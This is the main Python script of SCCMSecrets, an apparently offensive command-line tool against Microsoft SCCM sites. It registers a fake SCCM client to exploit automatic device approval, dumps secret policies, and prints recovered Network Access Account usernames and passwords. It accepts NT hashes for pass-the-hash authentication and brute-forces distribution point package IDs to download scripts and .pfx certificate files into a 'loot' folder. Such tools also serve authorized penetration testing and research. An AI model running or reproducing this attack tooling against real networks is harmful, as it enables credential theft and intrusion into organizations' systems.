import os
import typer
import logging
import traceback

from datetime                           import datetime
from time                               import sleep
from typing_extensions                  import Annotated
from cryptography.hazmat.primitives     import serialization

from utils.packageDownloadUtils         import checkAnonymousDPConnectionEnabled, retrieveSiteCode, packageScriptDownload
from utils.clientRegistrationUtils      import clientRegistration
from utils.policiesUtils                import secretPolicyProcess, policiesRequest, secretPolicyProcess
from conf                               import bcolors, ANONYMOUSDP, DOWNLOADMETHOD, SCENARIOS, SCCMPoliciesDumpError

logger = logging.getLogger(__name__)


app = typer.Typer(context_settings={"help_option_names": ["-h", "--help"]}, add_completion=False)

def print_banner():
    banner = """
 _____ _____  _____ ___  ___ _____                    _       
/  ___/  __ \/  __ \|  \/  |/  ___|                  | |      
\ `--.| /  \/| /  \/| .  . |\ `--.  ___  ___ _ __ ___| |_ ___ 
 `--. \ |    | |    | |\/| | `--. \/ _ \/ __| '__/ _ \ __/ __|
/\__/ / \__/\| \__/\| |  | |/\__/ /  __/ (__| | |  __/ |_\__ \\
\____/ \____/ \____/\_|  |_/\____/ \___|\___|_|  \___|\__|___/
 -------------------------------------------------------------
    """
    logger.warning(banner)

def print_policies_dump_banner():
    banner = """

###################
## Policies dump ##
###################"""
    logger.warning(banner)

def print_dp_file_dump_banner():
    banner = """

##################################
## Distribution Point file dump ##
##################################"""
    logger.warning(banner)

@app.command()
def main(
    distribution_point: Annotated[str, typer.Option("--distribution-point", "-dp", help="An SCCM distribution point", rich_help_panel="Options")] = None,
    management_point: Annotated[str, typer.Option("--management-point", "-mp", help="The client's SCCM management point. Only necessary if the management point is not on the same machine as the distribution point", rich_help_panel="Options")] = None,
    username: Annotated[str, typer.Option("--username", "-u", help="A username for a domain account (can be a user account, or - preferably - a machine acount)", rich_help_panel="Options")] = None,
    password: Annotated[str, typer.Option("--password", "-p", help="The password for the domain account", rich_help_panel="Options")] = None,
    hash: Annotated[str, typer.Option("--hash", "-H", help="The NT hash for the domain account (e.g. A4F49C406510BDCAB6824EE7C30FD852)", rich_help_panel="Options")] = None,
    verbose: Annotated[bool, typer.Option("--verbose", "-v", help="Enable verbose output", rich_help_panel="Options")] = False,
    
    skip_policies_dump: Annotated[bool, typer.Option("--skip-policies-dump", "-sp", help="Do not perform secret policies dump", rich_help_panel="Policies dump options")] = False,
    client_name: Annotated[str, typer.Option("--client-name", "-cn", help="The name of the client that will be created in SCCM. An FQDN is expected (e.g. fake.corp.com)", rich_help_panel="Policies dump options")] = None,
    registration_sleep: Annotated[int, typer.Option("--registration-sleep", "-rs", help="The amount of time, in seconds, that should be waited after registrating a new device. A few minutes is recommended so that the new device can be added to device collections (3 minutes by default, may need to be increased)", rich_help_panel="Policies dump options")] = 180,
    use_existing_device: Annotated[str, typer.Option("--use-existing-device", "-d", help="This option can be used to re-run SCCMSecrets.py using a previously registered device ; or to impersonate a legitimate SCCM client. In both cases, it expects the path of a folder containing a guid.txt file (the SCCM device GUID) and the key.pem file (the client's private key). Note that a client-name value must also be provided to SCCMSecrets (but does not have to match the one of the existing device)", rich_help_panel="Policies dump options")] = None,
    
    skip_file_dump: Annotated[bool, typer.Option("--skip-file-dump", "-sf", help="Do not perform Distribution Point file dump", rich_help_panel="DP file dump options")] = False,
    index_method: Annotated[DOWNLOADMETHOD, typer.Option("--index-method", "-m", help="The method used to index files from the distribution point. Datalib should be preferred over bruteforce (the latter being less efficient and less exhaustive)", rich_help_panel="DP file dump options")] = DOWNLOADMETHOD.datalib,
    index_file: Annotated[str, typer.Option("--index-file", "-if", help="Use an existing indexing file previously produced by SCCMSecrets, which avoids re-indexing files from the Distribution Point. This option expects the 'packages/index.json' file from an SCCMSecrets loot directory", rich_help_panel="DP file dump options")] = None,
    extensions: Annotated[str, typer.Option("--extensions", "-e", help="Comma-separated list of extension that will determine which files will be downloaded when retrieving packages scripts. Provide an empty string to not download anything, and only index files", rich_help_panel="DP file dump options")] = '.ps1, .bat, .xml, .txt, .pfx', 
    files: Annotated[str, typer.Option("--files", "-f", help="A file containing a list of URLs (one per line) that should be downloaded from the Distribution Point. This is useful if you already indexed files and do not want to download by extension, but rather specific known files", rich_help_panel="DP file dump options")] = None,
    bruteforce_range: Annotated[int, typer.Option("--bruteforce-range", "-bf", help="The number of package ID to bruteforce when indexing files through the bruteforce method. Between 0 (00000) and 1048575 (FFFFF)", rich_help_panel="DP file dump options")] = 4095,
):
    ### ============================== ###
    ### Print banner, handle verbosity ###
    ### ============================== ###
    print_banner()
    if verbose is False: logging.basicConfig(format='%(message)s', level=logging.WARN)
    else: logging.basicConfig(format='%(message)s', level=logging.INFO)
    

    ### ===================================== ###
    ### Arguments format and coherence checks ###
    ### ===================================== ###
    if management_point is None and distribution_point is None:
        logger.error(f"{bcolors.FAIL}[-] One of management-point and distribution-point needed{bcolors.ENDC}")
        return
    
    if management_point is not None and distribution_point is None: distribution_point = management_point
    if distribution_point is not None and management_point is None: management_point = distribution_point

    if not distribution_point.startswith('http://'): distribution_point = f'http://{distribution_point}'
    if distribution_point.endswith('/'): distribution_point = distribution_point[:-1]
    if not management_point.startswith('http://'): management_point = f'http://{management_point}'
    if management_point.endswith('/'): management_point = management_point[:-1]

    if bruteforce_range < 0 or bruteforce_range > 1048575:
        logger.error(f"[-]{bcolors.FAIL}Invalid bruteforce range.{bcolors.ENDC}")
        return

    if not extensions:
        extensions = []
    else:
        extensions = [x.strip() for x in extensions.split(',')]

    site_code = retrieveSiteCode(management_point)
    if not site_code:
        logger.warning(f"[!] Could not retrieve site code.")
        
    anonymousDPConnectionEnabled = checkAnonymousDPConnectionEnabled(distribution_point)

    if username is not None and (password is None and hash is None):
        logger.error(f"{bcolors.FAIL}[!] When providing a username, please also provide either the cleartext password or the NT hash{bcolors.ENDC}")
        return

    if hash is not None and len(hash) != 32:
        logger.error(f"{bcolors.FAIL}[!] The provided NT hash does not have the expected format (e.g. A4F49C406510BDCAB6824EE7C30FD852){bcolors.ENDC}")
        return

    # If the user did not provide a password but the NT hash, use the hash as password
    if password is None and hash is not None:
        password = '0' * 32 + ':' + hash

    if username is None:
        credentialsProvided = False
        machineAccountProvided = False
    else:
        credentialsProvided = True
        if username.endswith('$'):
            machineAccountProvided = True
        else:
            machineAccountProvided = False

    if index_method == DOWNLOADMETHOD.bruteforce and site_code is None and skip_file_dump is False:
        logger.error(f"{bcolors.FAIL}[!] Could not determine sitecode. Bruteforce method for Distribution Point file dumping relies on it. Exiting{bcolors.ENDC}")
        return
    
    download_options = {
        "distribution_point": distribution_point,
        "site_code": site_code,
        "bruteforce_range": bruteforce_range,
        "extensions": extensions,
        "known_packages": [],
        "anonymous": anonymousDPConnectionEnabled,
        "method": index_method,
        "index_file": index_file,
        "files": files
    }


    ### ============================================= ###
    ### Loading existing device information if needed ###
    ### ============================================= ###
    if use_existing_device is not None:
        try:
            if use_existing_device.endswith('/'): use_existing_device = use_existing_device[:-1]
            with open(f'{use_existing_device}/key.pem', 'rb') as f:
                key_data = f.read()
            private_key = serialization.load_pem_private_key(key_data, password=None)

            with open(f'{use_existing_device}/guid.txt', 'r') as f:
                client_guid = f.read().strip()
            
        except:
            traceback.print_exc()
            logger.error(f"{bcolors.FAIL} [-] Error while loading existing device information.{bcolors.ENDC}")
            return


    ### ========================= ###
    ### Output directory creation ###
    ### ========================= ###
    if not os.path.exists('loot'):
        os.makedirs('loot')
    directory_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    os.makedirs(f"loot/{directory_name}")

    
    ### ============================== ###
    ### Displaying context information ###
    ### ============================== ###
    logger.warning("\n")
    logger.warning(f"##### Context information #####\n")
    lines = []

    if anonymousDPConnectionEnabled == ANONYMOUSDP.ENABLED.value:
        lines.append(f" - Anonymous Distribution Point access: {bcolors.OKGREEN}{bcolors.BOLD}[VULNERABLE]{bcolors.ENDC} Distribution point allows anonymous access{bcolors.ENDC}")
    elif anonymousDPConnectionEnabled == ANONYMOUSDP.DISABLED.value:
        lines.append(f" - Anonymous Distribution Point access: {bcolors.FAIL}{bcolors.BOLD}[NOT VULNERABLE]{bcolors.ENDC} (distribution point does not allow anonymous access)")
    else:
        lines.append(f" - Anonymous Distribution Point access: {bcolors.FAIL}{bcolors.BOLD}[UNKNOWN]{bcolors.ENDC} Unexpected anonymous access check result{bcolors.ENDC}")

    if credentialsProvided is False:
        lines.append(f" - Credentials provided: {bcolors.BOLD}[NONE]{bcolors.ENDC} (no credentials provided)")
    elif machineAccountProvided is False:
        lines.append(f" - Credentials provided: {bcolors.BOLD}[DOMAIN USER]{bcolors.ENDC} (domain user credentials, but no machine account)")
    else:
        lines.append(f" - Credentials provided: {bcolors.BOLD}[MACHINE ACCOUNT]{bcolors.ENDC} (machine account credentials provided)")
    
    lines.append(f" - Distribution point: {distribution_point}")
    lines.append(f" - Management point: {management_point}")
    lines.append(f" - Site code: {bcolors.BOLD}{site_code if site_code is not None else '?'}{bcolors.ENDC}")
    lines.append(f" - File extensions to retrieve: {extensions}")
    lines.append(f" - DP file indexing method: {index_method.value}")
    lines.append(f" - Output directory: {bcolors.BOLD}./loot/{directory_name}{bcolors.ENDC}")
    split_lines = [line.split(':', 1) for line in lines]
    max_key_length = max(len(key.strip()) for key, value in split_lines)
    for key, value in split_lines:
        logger.warning(f"{key.strip():<{max_key_length}} : {value.strip()}")
    
    logger.warning("\n###############################")
    logger.warning("\n")


    ### ==================================================== ###
    ### Prompting information to user ; determining scenario ###
    ### ==================================================== ###
    if not credentialsProvided and anonymousDPConnectionEnabled != ANONYMOUSDP.ENABLED.value:
        info_msg = "No credentials were provided, and target distribution point does not accept anonymous access. In these conditions, we can:"
        if use_existing_device is None:
            info_msg += f"\n> {bcolors.BOLD}[Policies dump]{bcolors.ENDC} Try to register an SCCM client in order to exploit automatic device approval if it is configured on the SCCM site (this misconfiguration is not present by default). If successful, secret policies will be retrieved."
            info_msg +=f"\n> {bcolors.BOLD}[DP file dump]{bcolors.ENDC} If secret policies dump was successful and said policies contain NAA credentials, these will be used to index and download Distribution Point files."
        else:
            info_msg += f"\n> {bcolors.BOLD}[Policies dump]{bcolors.ENDC} Try to use the provided device to dump secret policies."
            info_msg += f"\n> {bcolors.BOLD}[DP file dump]{bcolors.ENDC} If secret policies dump was successful and said policies contain NAA credentials, these will be used to index and download Distribution Point files."
        logger.warning(info_msg)
        scenario = SCENARIOS.NoCredsNoAnonymous.value

    elif not credentialsProvided and anonymousDPConnectionEnabled == ANONYMOUSDP.ENABLED.value:
        info_msg = "No credentials were provided, but target distribution point does accept anonymous access. In these conditions, we can:"
        if use_existing_device is None:
            info_msg += f"\n> {bcolors.BOLD}[Policies dump]{bcolors.ENDC} Try to register an SCCM client in order to exploit automatic device approval if it is configured on the SCCM site (this misconfiguration is not present by default). If successful, secret policies will be retrieved."
        else:
            info_msg += f"\n> {bcolors.BOLD}[Policies dump]{bcolors.ENDC} Try to use the provided device to dump secret policies."
        info_msg += f"\n> {bcolors.BOLD}[DP file dump]{bcolors.ENDC} Index and download Distribution Point files."
        logger.warning(info_msg)
        scenario = SCENARIOS.NoCredsAnonymous.value

    elif credentialsProvided and not machineAccountProvided:
        info_msg = "Domain user account credentials were provided, but no machine account credentials. In these conditions, we can:"
        if use_existing_device is None:
            info_msg += f"\n> {bcolors.BOLD}[Policies dump]{bcolors.ENDC} Try to register an SCCM client in order to exploit automatic device approval if it is configured on the SCCM site (this misconfiguration is not present by default). If successful, secret policies will be retrieved."
        else:
            info_msg += f"\n> {bcolors.BOLD}[Policies dump]{bcolors.ENDC} Try to use the provided device to dump secret policies."        
        info_msg += f"\n> {bcolors.BOLD}[DP file dump]{bcolors.ENDC} Index and download Distribution Point files."
        logger.warning(info_msg)
        scenario = SCENARIOS.UserCreds.value
    
    elif machineAccountProvided:
        info_msg = "Machine account credentials provided. In these conditions, we can:"
        if use_existing_device is None:
            info_msg += f"\n> {bcolors.BOLD}[Policies dump]{bcolors.ENDC} Register an SCCM client to retrieve secret policies."
        else:
            info_msg += f"\n> {bcolors.BOLD}[Policies dump]{bcolors.ENDC} Try to use the provided device to retrieve secret policies."
        info_msg += f"\n> {bcolors.BOLD}[DP file dump]{bcolors.ENDC} Index and download Distribution Point files."
        logger.warning(info_msg)
        scenario = SCENARIOS.MachineCreds.value

    else:
        logger.error("[-] Unknown scenario - this should not happen.")
        return



    if skip_policies_dump is False:
        if use_existing_device is None:
            confirmation = typer.confirm("\nOPsec consideration: secret policies dump requires registering an SCCM client that we will not be able to remove afterwards. Proceed ?")
        else:
            confirmation = typer.confirm (f"\nWe will be using the existing device with GUID {client_guid}. Proceed ?")
        if not confirmation:
            skip_policies_dump = True

    if skip_policies_dump is False and client_name is None:
        logger.error(f"{bcolors.FAIL}[-] Registering a client or using an existing device requires to provide the client_name argument. Note that for an existing device, this can be anything and does not need to match the one of the device.{bcolors.ENDC}")
        return




    ### ============ ###
    ### Scenario n°1 ###
    ### ============ ###
    if scenario == SCENARIOS.NoCredsNoAnonymous.value:
        naa_username = None
        naa_password = None

        # Policies dump
        print_policies_dump_banner()
        if skip_policies_dump is True:
            logger.warning(f"{bcolors.OKBLUE}\n[*] Skipping policies dump.{bcolors.ENDC}")
        else:
            try:
                if use_existing_device is None:
                    private_key, client_guid = clientRegistration(management_point, username, password, machineAccountProvided, client_name, directory_name)
                    logger.warning(f"[*] Sleeping for {registration_sleep} seconds ...")
                    sleep(registration_sleep)
                secret_policies = policiesRequest(management_point, private_key, client_guid, client_name, directory_name)
                if len(secret_policies.keys()) > 0:
                    if use_existing_device is None:
                        logger.warning(f"{bcolors.OKGREEN}{bcolors.BOLD}[+] We retrieved some secret policies, which indicates that the target site is vulnerable to automatic device approval.{bcolors.ENDC}")
                    for key, value in secret_policies.items():
                        try:
                            result = secretPolicyProcess(key, value, private_key, client_guid, directory_name)
                            download_options['known_packages'].extend(result['known_packages'])
                            if result["NAA_credentials"] is not None:
                                naa_username = result['NAA_credentials']["NetworkAccessUsername"].split('\\')[1][:-1]
                                naa_password = result['NAA_credentials']["NetworkAccessPassword"][:-1]
                                logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'{bcolors.ENDC}")
                                logger.warning(f"[*] We will try to use these credentials to dump package scripts from distribution point ...")
                        except Exception as e:
                            logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy.{bcolors.ENDC}")
                            traceback.print_exc()
                    
                    if naa_username is not None and naa_password is not None:
                        print_dp_file_dump_banner()
                        if skip_file_dump is True:
                            logger.warning(f"{bcolors.OKBLUE}\n[*] Skipping Distribution Point file dump.{bcolors.ENDC}")
                        else:
                            packageScriptDownload(download_options, directory_name, username=naa_username, password=naa_password)
                else:
                    logger.warning(f"{bcolors.FAIL}[-] Could not retrieve any secret policies. Automatic device approval may not be enabled on target site.{bcolors.ENDC}")
            
            except SCCMPoliciesDumpError as e:
                logger.info(traceback.print_exc())
                logger.error(f"{bcolors.FAIL}[-] {str(e)}{bcolors.ENDC}")
            except Exception as e:
                traceback.print_exc()
                logger.error(f"{bcolors.FAIL}[-] Unexpected error encountered during SCCM policies dump")


    ### ============ ###
    ### Scenario n°2 ###
    ### ============ ###
    if scenario == SCENARIOS.NoCredsAnonymous.value:

        # Policies dump
        print_policies_dump_banner()
        if skip_policies_dump is True:
            logger.warning(f"{bcolors.OKBLUE}\n[*] Skipping policies dump.{bcolors.ENDC}")
        else:
            try:
                if use_existing_device is None:
                    private_key, client_guid = clientRegistration(management_point, username, password, machineAccountProvided, client_name, directory_name)
                    logger.warning(f"[*] Sleeping for {registration_sleep} seconds ...")
                    sleep(registration_sleep)
                secret_policies = policiesRequest(management_point, private_key, client_guid, client_name, directory_name)
                if len(secret_policies.keys()) > 0:
                    if use_existing_device is None:
                        logger.warning(f"{bcolors.OKGREEN}{bcolors.BOLD}[+] We retrieved some secret policies, which indicates that the target site is vulnerable to automatic device approval.{bcolors.ENDC}")
                    for key, value in secret_policies.items():
                        try:
                            result = secretPolicyProcess(key, value, private_key, client_guid, directory_name)
                            download_options['known_packages'].extend(result['known_packages'])
                            if result["NAA_credentials"] is not None:
                                logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'{bcolors.ENDC}")
                        except Exception as e:
                            logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy.{bcolors.ENDC}")
                            traceback.print_exc()
                else:
                    logger.warning(f"{bcolors.FAIL}[-] Could not retrieve any secret policies. Automatic device approval may not be enabled on target site.{bcolors.ENDC}")
            
            except SCCMPoliciesDumpError as e:
                logger.info(traceback.print_exc())
                logger.error(f"{bcolors.FAIL}[-] {str(e)}{bcolors.ENDC}")
            except Exception as e:
                traceback.print_exc()
                logger.error(f"{bcolors.FAIL}[-] Unexpected error encountered during SCCM policies dump")

        # DP file dump
        print_dp_file_dump_banner()
        if skip_file_dump is True:
            logger.warning(f"{bcolors.OKBLUE}\n[*] Skipping Distribution Point file dump.{bcolors.ENDC}")
        else:
            packageScriptDownload(download_options, directory_name, username=None, password=None)


    ### ============ ###
    ### Scenario n°3 ###
    ### ============ ###
    if scenario == SCENARIOS.UserCreds.value:

        # Policies dump
        print_policies_dump_banner()
        if skip_policies_dump is True:
            logger.warning(f"{bcolors.OKBLUE}\n[*] Skipping policies dump.{bcolors.ENDC}")
        else:
            try:
                if use_existing_device is None:
                    private_key, client_guid = clientRegistration(management_point, username, password, machineAccountProvided, client_name, directory_name)
                    logger.warning(f"[*] Sleeping for {registration_sleep} seconds ...")
                    sleep(registration_sleep)
                secret_policies = policiesRequest(management_point, private_key, client_guid, client_name, directory_name)
                if len(secret_policies.keys()) > 0:
                    if use_existing_device is None:
                        logger.warning(f"{bcolors.OKGREEN}{bcolors.BOLD}[+] We retrieved some secret policies, which indicates that the target site is vulnerable to automatic device approval.{bcolors.ENDC}")
                    for key, value in secret_policies.items():
                        try:
                            result = secretPolicyProcess(key, value, private_key, client_guid, directory_name)
                            download_options['known_packages'].extend(result['known_packages'])
                            if result['NAA_credentials'] is not None:
                                logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'{bcolors.ENDC}")
                        except Exception as e:
                            logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy.{bcolors.ENDC}")
                            traceback.print_exc()
                else:
                    logger.warning(f"{bcolors.FAIL}[-] Could not retrieve any secret policies. Automatic device approval may not be enabled on target site, or device is not approved.{bcolors.ENDC}")
            
            except SCCMPoliciesDumpError as e:
                logger.info(traceback.print_exc())
                logger.error(f"{bcolors.FAIL}[-] {str(e)}{bcolors.ENDC}")
            except Exception as e:
                traceback.print_exc()
                logger.error(f"{bcolors.FAIL}[-] Unexpected error encountered during SCCM policies dump")

        # DP file dump
        print_dp_file_dump_banner()
        if skip_file_dump is True:
            logger.warning(f"{bcolors.OKBLUE}\n[*] Skipping Distribution Point file dump.{bcolors.ENDC}")
        else:
            if anonymousDPConnectionEnabled  == ANONYMOUSDP.ENABLED.value:
                packageScriptDownload(download_options, directory_name, username=None, password=None)
            else:
                packageScriptDownload(download_options, directory_name, username=username, password=password)


    ### ============ ###
    ### Scenario n°4 ###
    ### ============ ###
    if scenario == SCENARIOS.MachineCreds.value:

        # Policies dump
        print_policies_dump_banner()
        if skip_policies_dump is True:
            logger.warning(f"{bcolors.OKBLUE}\n[*] Skipping policies dump.{bcolors.ENDC}")
        else:
            try:
                if use_existing_device is None:
                    private_key, client_guid = clientRegistration(management_point, username, password, machineAccountProvided, client_name, directory_name)
                    logger.warning(f"[*] Sleeping for {registration_sleep} seconds ...")
                    sleep(registration_sleep)
                secret_policies = policiesRequest(management_point, private_key, client_guid, client_name, directory_name)
                if len(secret_policies.keys()) > 0:
                    for key, value in secret_policies.items():
                        try:
                            result = secretPolicyProcess(key, value, private_key, client_guid, directory_name)
                            download_options['known_packages'].extend(result['known_packages'])
                            if result['NAA_credentials'] is not None:
                                logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'{bcolors.ENDC}")
                        except Exception as e:
                            logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy.{bcolors.ENDC}")
                            traceback.print_exc()
            except SCCMPoliciesDumpError as e:
                logger.info(traceback.print_exc())
                logger.error(f"{bcolors.FAIL}[-] {str(e)}{bcolors.ENDC}")
            except Exception as e:
                traceback.print_exc()
                logger.error(f"{bcolors.FAIL}[-] Unexpected error encountered during SCCM policies dump")

        # DP file dump
        print_dp_file_dump_banner()
        if skip_file_dump is True:
            logger.warning(f"{bcolors.OKBLUE}\n[*] Skipping Distribution Point file dump.{bcolors.ENDC}")
        else:
            if anonymousDPConnectionEnabled  == ANONYMOUSDP.ENABLED.value:
                packageScriptDownload(download_options, directory_name, username=None, password=None)
            else:
                packageScriptDownload(download_options, directory_name, username=username, password=password)
    
    

    logger.warning(f"[*] All done. Bye !")
    

    
if __name__ == "__main__":
    app()
